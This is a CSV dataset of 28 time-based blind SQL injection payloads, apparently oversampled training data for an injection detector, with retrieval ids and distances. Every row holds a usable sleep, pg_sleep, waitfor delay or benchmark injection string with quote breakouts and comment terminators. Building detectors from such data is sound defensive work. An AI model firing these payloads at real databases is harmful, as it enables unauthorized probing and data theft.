id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000202,1.0142655727198677
SMOTE_000002,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,1.0940267287067098
SMOTE_000003,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000155,0.405516706919972
SMOTE_000004,attack,time,"1%""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000234,0.7873341678848081
SMOTE_000005,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000129,0.0764848196748626
SMOTE_000006,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,0.24680764797947727
SMOTE_000007,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000099,0.7568575155173153
SMOTE_000008,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000199,1.1192583334031407
SMOTE_000009,attack,time,1  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000246,2.2651612402013344
SMOTE_000010,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000049,1.209110522498946
SMOTE_000011,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000161,0.4760817090102375
SMOTE_000012,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000184,0.21458444008083283
SMOTE_000013,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,0.6568171236428817
SMOTE_000014,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000089,0.39478943385018633
SMOTE_000015,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,0.5693570401316748
SMOTE_000016,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000166,0.06723931012139375
SMOTE_000017,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",nearest_attack_euclidean,R000085,1.295949310430369
SMOTE_000018,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000037,1.2911181163161276
SMOTE_000019,attack,time,1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,nearest_attack_euclidean,R000232,0.5331915132332463
SMOTE_000020,attack,time,1 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000243,0.9624542219167116
SMOTE_000021,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.24415261242728953
SMOTE_000022,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000066,1.3141837199464397
SMOTE_000023,attack,time,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000248,0.489504229945312
SMOTE_000024,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000308,0.986022110747541
SMOTE_000025,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000264,0.19286393739723615
SMOTE_000026,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000018,1.7045632411593383
SMOTE_000027,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000240,1.5380102632806134
SMOTE_000028,attack,time,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000237,1.5216231495564783
